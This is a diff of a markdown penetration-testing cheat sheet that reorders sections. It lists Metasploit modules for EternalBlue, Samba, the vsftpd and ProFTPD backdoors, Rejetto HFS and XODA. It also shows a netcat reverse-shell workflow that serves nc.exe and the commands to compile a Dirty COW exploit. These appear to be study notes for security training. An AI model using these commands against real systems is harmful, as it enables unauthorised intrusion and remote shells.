@@ -361,20 +361,78 @@ use auxiliary/scanner/ssh/ssh_enumusers
 - FTP
   - [ProFTPD 1.3.3c](#ProFTPD-133c) 
   - [vsftpd 2.3.4](#vsftpd-234)
-- SMB/Samba
-  - [EternalBlue](#EternalBlue)
-  - [Samba smbd 3.X - 4.X](#Samba-smbd-3X---4X)
 - HTTP
   - [BadBlue httpd 2.7](#BadBlue-httpd-27)
   - [Rejetto HttpFileServer 2.3](#Rejetto-HttpFileServer-23)
+- SMB/Samba
+  - [EternalBlue](#EternalBlue)
+  - [Samba smbd 3.X - 4.X](#Samba-smbd-3X---4X)
+- Others
+  - [XODA 0.4.5](#XODA-045)
+  - [Exploit Database Binary Exploits](#Exploit-Database-Binary-Exploits)
 - [ARP Poisoning](#ARP-Poisoning)
 - [AV Evasion and Obfuscation](#AV-Evasion-and-Obfuscation)
-- [Exploit Database Binary Exploits](#Exploit-Database-Binary-Exploits)
-- [Linux Compilation](#Linux-Compilation)
 - [MSF Payloads and Listeners](#MSF-Payloads-and-Listeners)
   - [msfvenom](#msfvenom)
-- [XODA 0.4.5](#XODA-045)
+- [Linux Compilation](#Linux-Compilation)
 - [Windows Cross-Compilation](#Windows-Cross-Compilation)
+
+## FTP
+### ProFTPD 1.3.3c
+```
+use exploit/unix/ftp/proftpd_133c_backdoor
+```
+
+### vsftpd 2.3.4
+```
+use exploit/unix/ftp/vsftpd_234_backdoor
+```
+
+## HTTP
+### BadBlue httpd 2.7
+```
+use exploit/windows/http/badblue_passthru
+```
+
+### Rejetto HttpFileServer 2.3
+```
+use exploit/windows/http/rejetto_hfs_exec
+```
+```
+searchsploit -m 39161
+
+cd ~/Desktop
+cp /usr/share/windows-resources/binaries/nc.exe ./
+python -m SimpleHTTPServer 80
+
+vi 39161.py
+Change ip_addr and local_port
+nc -nvlp <port>
+
+python 39161.py <ip> <port>
+```
+
+## SMB/Samba
+### EternalBlue
+```
+use auxiliary/scanner/smb/smb_ms17_010
+use exploit/windows/smb/ms17_010_eternalblue
+```
+
+### Samba smbd 3.X - 4.X
+```
+use exploit/linux/samba/is_known_pipename
+```
+
+## Others
+### XODA 0.4.5
+```
+use exploit/unix/webapp/xoda_file_upload
+```
+- Set `TARGETURI` accordingly.
+
+### Exploit Database Binary Exploits
+- https://gitlab.com/exploit-database/exploitdb-bin-sploits
 
 ## ARP Poisoning
 ```
@@ -439,28 +497,6 @@ ALL
 1
 ```
 
-## BadBlue httpd 2.7
-```
-use exploit/windows/http/badblue_passthru
-```
-
-## EternalBlue
-```
-use auxiliary/scanner/smb/smb_ms17_010
-
-use exploit/windows/smb/ms17_010_eternalblue
-```
-
-## Exploit Database Binary Exploits
-- https://gitlab.com/exploit-database/exploitdb-bin-sploits
-
-## Linux Compilation
-```
-searchsploit -m 40839
-
-gcc -pthread 40839.c -o dirty -lcrypt
-```
-
 ## MSF Payloads and Listeners
 - 64-bit (`x64`) payload cannot run on 32-bit architecture.
 - Staged payload (exploit and shellcode sent separately).
@@ -512,44 +548,12 @@ msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -i <iteration> -
 
 #### Injecting Payloads into Window PEs
 
-## ProFTPD 1.3.3c
+## Linux Compilation
 ```
-use exploit/unix/ftp/proftpd_133c_backdoor
-```
+searchsploit -m 40839
 
-## Rejetto HttpFileServer 2.3
+gcc -pthread 40839.c -o dirty -lcrypt
 ```
-use exploit/windows/http/rejetto_hfs_exec
-```
-```
-searchsploit -m 39161
-
-cd ~/Desktop
-cp /usr/share/windows-resources/binaries/nc.exe ./
-python -m SimpleHTTPServer 80
-
-vi 39161.py
-Change ip_addr and local_port
-nc -nvlp <port>
-
-python 39161.py <ip> <port>
-```
-
-## Samba smbd 3.X - 4.X
-```
-use exploit/linux/samba/is_known_pipename
-```
-
-## vsftpd 2.3.4
-```
-use exploit/unix/ftp/vsftpd_234_backdoor
-```
-
-## XODA 0.4.5
-```
-use exploit/unix/webapp/xoda_file_upload
-```
-- Set `TARGETURI` accordingly.
 
 ## Windows Cross-Compilation
 ```
